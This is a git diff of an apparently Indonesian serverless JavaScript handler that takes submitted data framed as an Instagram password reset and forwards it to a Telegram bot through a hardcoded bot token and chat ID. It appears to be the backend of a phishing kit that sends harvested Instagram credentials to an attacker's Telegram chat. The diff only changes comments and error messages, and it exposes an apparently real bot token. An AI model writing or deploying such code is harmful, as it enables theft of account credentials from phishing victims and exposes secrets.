@@ -9,9 +9,9 @@ export default async function handler(req, res) {
     return res.status(400).json({ message: 'Data tidak lengkap' });
   }
 
-  // Token dan Chat ID langsung ditulis
-  const botToken = '8005969343:AAH906NhVkByakkeBW4HIspe7CutjlZF2qk'; // Ganti token bot kamu
-  const chatId = '7721157555'; // Ganti chat ID tujuan
+  // Ganti ini dengan milikmu
+  const botToken = '8005969343:AAH906NhVkByakkeBW4HIspe7CutjlZF2qk'; // GANTI
+  const chatId = '7721157555'; // GANTI
 
   const message = `
 🔐 *Reset Password Instagram*
@@ -36,13 +36,19 @@ export default async function handler(req, res) {
     const result = await telegramRes.json();
 
     if (!telegramRes.ok || !result.ok) {
-      console.error('Telegram API error:', result);
-      return res.status(500).json({ message: result.description || 'Gagal mengirim ke Telegram' });
+      console.error('❌ Telegram API Error:', result);
+
+      return res.status(500).json({
+        message: `❌ Gagal kirim ke Telegram: ${result.description || 'Unknown error'}`,
+      });
     }
 
-    return res.status(200).json({ message: 'Berhasil' });
+    return res.status(200).json({ message: '✅ Pesan berhasil dikirim ke Telegram.' });
   } catch (error) {
-    console.error('Fetch error:', error);
-    return res.status(500).json({ message: 'Terjadi kesalahan saat mengirim ke Telegram' });
+    console.error('❌ Fetch Error:', error);
+
+    return res.status(500).json({
+      message: `❌ Terjadi kesalahan saat fetch: ${error.message}`,
+    });
   }
 }
